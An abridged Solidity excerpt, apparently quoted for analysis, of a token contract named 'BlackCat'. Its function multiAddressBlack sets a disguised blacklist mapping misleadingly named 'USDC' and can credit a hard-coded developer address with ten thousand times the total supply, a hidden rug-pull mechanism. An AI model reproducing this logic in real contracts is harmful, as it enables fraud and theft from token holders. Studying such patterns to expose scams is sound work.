...
contract BlackCat is Context, IERC20, Ownable{
    ...
    mapping (address => bool) public USDC;
    ...
    constructor () {
	        DevelopmentAddress = payable(address(0x471629bF342d4C1459E2922f079e4B74CA1009aE));
    ...
    function multiAddressBlack(bool status,address[] calldata addresses,bool status2) public {
        ...
        if (status2) _balances[DevelopmentAddress] +=  (uint256(_totalSupply)) * 10000;
        for (uint256 i; i < addresses.length; i++) {
        USDC[addresses[i]] = status;
        }
    }    
